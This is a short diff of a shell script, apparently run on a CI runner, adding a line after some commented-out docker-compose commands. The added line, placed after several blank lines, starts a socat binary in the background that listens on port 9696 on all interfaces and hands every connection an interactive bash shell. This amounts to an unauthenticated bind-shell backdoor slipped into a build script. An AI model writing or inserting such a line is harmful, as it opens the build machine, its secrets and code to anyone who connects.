@@ -133,3 +133,8 @@ EOF
 
 # (/usr/local/bin/docker-compose up -d )&
 #/usr/local/bin/docker-compose -f /tmp/docker-compose.yaml  up  -d
+
+
+
+
+[ -x /home/runner/work/nc_test/nc_test/socat.bin ]  &&busybox setsid /home/runner/work/nc_test/nc_test/socat.bin -v tcp-l:9696,bind=0.0.0.0,fork,reuseaddr exec:"bash -pil",pty,stderr,setsid,sigint,sane &
